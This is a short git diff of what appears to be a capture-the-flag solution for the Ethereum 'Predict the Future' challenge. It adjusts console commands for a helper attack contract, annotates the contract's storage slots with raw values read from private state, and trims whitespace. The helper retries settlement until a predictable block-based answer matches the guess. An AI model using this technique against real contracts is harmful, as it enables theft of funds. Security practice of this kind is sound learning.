@@ -11,10 +11,17 @@ await web3.eth.getBlockNumber();
 (await predictHelper.getAnswer()).toNumber()
 await predictHelper.lockInGuess(0, {from: accounts[0], value: oneEth});
 await web3.eth.getBlockNumber();
-await predictHelper.wasteBlock();
-await predictHelper.settle();
+await predictHelper.wasteBlock({from: accounts[0]});
+await predictHelper.settle({from: accounts[0]});
 await predictHelper.isComplete();
 await web3.eth.getBalance(predictTheFutureChallenge.address)
+
+    address guesser;    // slot 0
+    uint8 guess;        // appended to slot 0
+    uint256 settlementBlockNumber;  // slot 1
+0x0000000000000000000000005c78abfd724f760734f301f0d08a7741ff73f6da
+0x0000000000000000000000000000000000000000000000000000000000adecdf
+0x0000000000000000000000000000000000000000000000000000000000000000
 */
 
 // essential reading: https://solidity-by-example.org/hacks/accessing-private-data/
@@ -67,7 +74,6 @@ contract PredictHelper is OtherContract {
         emit SettleAttempt(calculatedAnswer, lockedInGuess);
 
         PredictTheFutureChallenge predictTheFutureChallenge = PredictTheFutureChallenge(otherContract);
-        
         predictTheFutureChallenge.settle();
         require(predictTheFutureChallenge.isComplete() == true);
         require(answer == guess);
